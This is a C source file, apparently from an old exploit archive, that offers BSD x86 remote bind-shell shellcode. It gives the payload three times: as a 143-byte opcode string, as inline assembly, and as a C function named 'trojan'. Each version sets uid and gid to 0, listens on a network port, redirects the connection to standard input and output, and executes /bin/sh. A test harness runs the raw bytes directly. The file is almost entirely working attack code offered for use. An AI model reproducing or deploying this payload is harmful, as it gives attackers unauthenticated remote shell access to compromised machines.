/*
Here is a BSD remote shellcode.
Tested on NetBSD . SHould work on FreeBSD and OpenBSD .

by MayheM
ExileCrew (www.exile2k.org)
*/

/*
** 143 bytes
*/
char shellcode[] =
"\x31\xC0"
"\x50"
"\x50"
"\xB0\x17"
"\xCD\x80"      // setuid
"\x31\xC0"
"\x50"
"\x50"
"\xB0\xB5"
"\xCD\x80"      // setgid
"\xEB\x60"
"\x5E"
"\x31\xC0"
"\x89\x46\x04"
"\x88\x46\x17"
"\x6A\x06"
"\x6A\x01"
"\x6A\x02"
"\xb0\x61"
"\x50"
"\xCD\x80"      // socket
"\x89\xc7"
"\x31\xc0"
"\x6a\x10"
"\x56"
"\x57"
"\xb0\x68"
"\x50"
"\xCD\x80"      // bind
"\x6A\x01"
"\x57"
"\xb0\x6A"
"\x50"
"\xCD\x80"      // listen
"\x50"
"\x50"
"\x57"
"\xB0\x1E"
"\x50"
"\xCD\x80"      //accept
"\x89\xc7"
"\x31\xDB"
"\x31\xc9"
"\xb1\x03"
"\x49"
"\x31\xc0"
"\xb0\x5A"
"\x51"
"\x57"
"\x50"
"\xcd\x80"      // dup2
"\x39\xd9"
"\x75\xf2"
"\x31\xc0"
"\x89\x76\x18"
"\x89\x46\x1c"
"\x8D\x56\x1c"
"\x8D\x4E\x18"
"\x83\xc6\x10"
"\x52"
"\x51"
"\x56"
"\xb0\x3b"
"\x50"
"\xcd\x80"      // execve
"\xe8\x9b\xff\xff\xff"
"\xc0\x02\x7a\x69\x90\x90\x90\x90\xc0\xd5\xbf\xef\xb8\xd5\xbf\xef"
"/bin/sh";






/*
** ASM shellcode
*/
fct()
{
  __asm__("


xorl  %eax, %eax
pushl %eax
pushl %eax
movb  $0x17, %al
int   $0x80

xorl  %eax, %eax
pushl %eax
pushl %eax
movb  $0xB5, %al
int   $0x80



jmp  data
code:
popl  %esi
xorl  %eax, %eax
movl  %eax, 0x04(%esi)
movb  %al , 0x17(%esi)

pushl $0x06
pushl $0x01
pushl $0x02
movb  $0x61, %al
pushl %eax
int   $0x80

movl  %eax, %edi
xorl  %eax, %eax
pushl $0x10
pushl %esi
pushl %edi
movb  $0x68, %al
pushl %eax
int   $0x80

pushl $0x01
pushl %edi
movb  $0x6A, %al
pushl %eax
int   $0x80

pushl %eax
pushl %eax
pushl %edi
movb  $0x1E, %al
pushl %eax
int   $0x80

movl  %eax, %edi
xorl  %ebx, %ebx
xorl  %ecx, %ecx
movb  $0x03, %ecx
loop:
decl  %ecx
xorl  %eax, %eax
movb  $0x5A, %al
pushl %ecx
pushl %edi
pushl %eax
int   $0x80
cmpl  %ebx, %ecx
jne   loop

xorl  %eax, %eax
movl  %esi, 0x18(%esi)
movl  %eax, 0x1C(%esi)
leal  0x1C(%esi), %edx
leal  0x18(%esi), %ecx
addl  $0x10, %esi
pushl %edx
pushl %ecx
pushl %esi
movb  $0x3B, %al
pushl %eax
int   $0x80

data:
call  code
.string \"\xC0\x02\x7A\x69\x90\x90\x90\x90\xC0\xD5\xBF\xEF\xB8\xD5\xBF\xEF\"
.string \"/bin/sh\x90\"
");
}




/*
** Test
*/
main()
{
  void  (*fct)();

  printf("shellcode lenght = %d bytes \n", sizeof(shellcode));
  fct = (void *) shellcode;
  fct();
}





/*
** C shellcode
*/
trojan()
{
  int                   clientsock;
  int                   serversock;
  char                  *server;
  char                  *args[2];

  server = "\xC0\x02\x7A\x69\x00\x00\x00\x00\xC0\xD5\xBF\xEF\xB8\xD5\xBF\xEF";
  args[0] = "/bin/sh";
  args[1] = 0x00;
  setuid(0);
  setgid(0);
  serversock = socket(0x02, 0x01, 0x06);
  bind(serversock, server, 0x10);
  listen(serversock, 0x01);
  clientsock = accept(serversock, 0x00, 0x00);
  dup2(clientsock, 0x02);
  dup2(clientsock, 0x01);
  dup2(clientsock, 0x00);
  execve(args[0], args, args[1]);
}

// milw0rm.com [2004-09-26]